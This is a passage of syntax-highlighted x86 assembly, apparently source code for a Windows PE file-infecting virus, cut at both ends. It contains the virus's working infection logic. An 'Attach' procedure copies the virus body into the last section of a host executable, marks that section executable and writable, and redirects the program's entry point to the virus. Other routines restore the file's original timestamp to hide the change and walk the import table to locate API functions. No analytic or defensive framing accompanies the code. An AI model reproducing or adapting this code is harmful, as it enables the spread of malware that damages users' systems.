                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile2</span><span class="sc0">       </span><span class="sc1">;if read only mode jump</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFilePointer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;move file pointer to</span><span class="sc0">
                                                         </span><span class="sc1">;the real end of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetEndOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;truncate file at</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;real end of file</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;restore original</span><span class="sc0">
                                                         </span><span class="sc1">;date/time stamp</span><span class="sc0">
</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile2</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;close handle</span><span class="sc0">

</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Attach</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;attach virus code to last section in the PE file and</span><span class="sc0">
                </span><span class="sc1">;  change section characteristicz to reflect infection</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  ECX = base of memory-maped file</span><span class="sc0">
                </span><span class="sc1">;  ESI = pointer to start of virus code</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  EDI = new file size</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get base adress</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">ebp.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get PE header base</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_FileHeader</span><span class="sc0"> \ </span><span class="sc1">;get Number of Sections</span><span class="sc0">
                          </span><span class="sc5">.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_FileHeader</span><span class="sc0"> \ </span><span class="sc1">;get 1st section header</span><span class="sc0">
                          </span><span class="sc5">.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;get last section header</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Attach2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ebp.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">v_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;find pointer in last section where virus</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">;will be copied</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">           </span><span class="sc1">;copy virus</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;calculate virus entry point</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebp.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;in RVA</span><span class="sc0">

</span><span class="sc5">end_Attach2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Attach</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;virus entry point</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">phost_start_rva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">v_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> \
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">(-</span><span class="sc2">4</span><span class="sc4">))]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">delta_host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">phost_start_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;harcode delta to</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;host base adress</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">     </span><span class="sc1">;edx=0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebp.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">;hardcode delta to original entry point RVA</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">     </span><span class="sc1">;edx=0</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;virus entry point</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;calculate new size of section (raw data)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebp.NT_OptionalHeader.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">virtual_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">(-</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Attach</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">n_vir</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;store new size of section (RVA)</span><span class="sc0">
 </span><span class="sc5">n_vir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;store new size of section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;(raw data)</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">n_img</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;store new size</span><span class="sc0">
                                                             </span><span class="sc1">;of image (RVA)</span><span class="sc0">
 </span><span class="sc5">n_img</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get new file size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_Characteristics.hiw.hib</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc2">0E0h</span><span class="sc0"> </span><span class="sc1">;change</span><span class="sc0">
                </span><span class="sc1">;       (IMAGE_SCN_MEM_EXECUTE or \     ;section characte-</span><span class="sc0">
                </span><span class="sc1">;        IMAGE_SCN_MEM_READ    or \     ;risticz to: execute,</span><span class="sc0">
                </span><span class="sc1">;        IMAGE_SCN_MEM_WRITE) shr 12    ;read &amp; write access</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get original file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">size_pad</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">     </span><span class="sc1">; edx=0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;compare it with new file size</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;take the greater</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">size_pad</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;grow file size to a multiple of size_pad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">;change</span><span class="sc0">
                                                               </span><span class="sc1">;entry point</span><span class="sc0">
</span><span class="sc5">end_Attach</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Attach</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetProcAddressIT</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc1">;gets a pointer to an API function from the Import Table</span><span class="sc0">
                      </span><span class="sc1">; (the object inspected is in raw form, ie memory-maped)</span><span class="sc0">
                      </span><span class="sc1">;on entry:</span><span class="sc0">
                      </span><span class="sc1">;  TOS+0Ch (Arg3): API function name</span><span class="sc0">
                      </span><span class="sc1">;  TOS+08h (Arg2): module name</span><span class="sc0">
                      </span><span class="sc1">;  TOS+04h (Arg1): base adress of memory-maped file</span><span class="sc0">
                      </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">
                      </span><span class="sc1">;on exit:</span><span class="sc0">
                      </span><span class="sc1">;  EAX = RVA pointer to IAT entry</span><span class="sc0">
                      </span><span class="sc1">;  EAX = 0, if not found</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">esp.cPushad.Arg1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get Module Handle from Arg1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebp.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get address of PE header + MZ_lfanew</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">    \ </span><span class="sc1">;get size of import directory</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">  \
                        </span><span class="sc5">.DE_Import</span><span class="sc0">            \
                        </span><span class="sc5">.DD_Size</span><span class="sc0">              \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">   </span><span class="sc1">;if size is zero, no API imported!</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader</span><span class="sc0"> \ </span><span class="sc1">;get number of sectionz</span><span class="sc0">
                          </span><span class="sc5">.FH_NumberOfSections</span><span class="sc0">  \
                          </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT2</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader</span><span class="sc0">     \ </span><span class="sc1">;get 1st section header</span><span class="sc0">
                          </span><span class="sc5">.FH_SizeOfOptionalHeader</span><span class="sc0">  \
                          </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">

</span><span class="sc5">match_virtual</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;find section containin the import table. (not necesarily</span><span class="sc0">
                </span><span class="sc1">;its in the .idata section!)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esi.NT_OptionalHeader</span><span class="sc0">    \ </span><span class="sc1">;get address of import table</span><span class="sc0">
                        </span><span class="sc5">.OH_DirectoryEntries</span><span class="sc0">  \
                        </span><span class="sc5">.DE_Import</span><span class="sc0">            \
                        </span><span class="sc5">.DD_VirtualAddress</span><span class="sc0">    \
                        </span><span class="sc4">-</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get RVA start pointer of</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;current section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;address of import table</span><span class="sc0">
                                                </span><span class="sc1">;inside current section?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">import_section_found</span><span class="sc0">            </span><span class="sc1">;yea, we found it</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">match_virtual</span><span class="sc0">                   </span><span class="sc1">;no, try next section</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">            </span><span class="sc1">;no more sectionz, shit.. go</span><span class="sc0">

</span><span class="sc5">import_section_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;get RAW size of import section (EBP)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;get RAW start of import section (EBX)</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">

</span><span class="sc5">Get_DLL_Name</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;scan each import descriptor inside import section to match</span><span class="sc0">
                </span><span class="sc1">;module name specified</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;diference (if any) between start</span><span class="sc0">
                                        </span><span class="sc1">;of imp.table and start of imp.section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.esi.ID_Name</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get RVA pointer to imp.module name</span><span class="sc0">

</span><span class="sc5">End_GetProcAddressIT2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">    </span><span class="sc1">;end of import descriptorz?</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;convert RVA pointer to RAW</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;check if it points inside section</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">x</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;save next import descriptor for later</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;retrieval</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get module name specified</span><span class="sc0">
